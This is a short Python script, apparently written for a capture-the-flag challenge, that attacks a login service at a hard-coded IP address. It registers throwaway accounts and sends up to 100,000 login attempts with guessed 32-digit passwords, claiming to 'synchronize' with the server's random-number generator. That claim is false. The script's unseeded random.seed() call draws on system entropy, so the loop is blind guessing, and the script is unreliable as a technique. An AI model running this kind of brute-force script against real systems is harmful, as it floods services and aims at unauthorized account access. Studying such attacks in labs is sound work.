import requests
import random

# Target URL
BASE_URL = "http://52.188.82.43:8060"

# First register a new account
register_data = {
    'email': 'hello@example.com',
    'username': 'hello8568'
}
response = requests.post(f"{BASE_URL}/register", data=register_data)

# Now try to login with predicted passwords
# Since we know the server uses random module, and may have just started,
# we can try to synchronize with its RNG state

# Reset our local random module to match possible server states
random.seed()  # Uses system time like the server might

prev_username = 'hello8568'
# Try recent possible passwords
for _ in range(100000):  # Try a reasonable number of attempts
    guessed_password = ''.join(random.choice('0123456789') for _ in range(32))
    login_data = {
        'username': prev_username,
        'password': guessed_password
    }
    response = requests.post(f"{BASE_URL}/login", data=login_data)
    if "incorrect" not in response.text:
        print(f"Success! Password: {guessed_password}")
        print(f"Flag: {response.text}")
        break
    rr = random.random()
    prev_username = f'hello{rr}'
    register_data = {
    'email': f'hello{rr}@example.com',
    'username': prev_username
    }
    response = requests.post(f"{BASE_URL}/register", data=register_data)

    # Now try to login with predicted passwords
    # Since we know the server uses random module, and may have just started,
    # we can try to synchronize with its RNG state

    # Reset our local random module to match possible server states
    random.seed()  # Uses system time like the server might
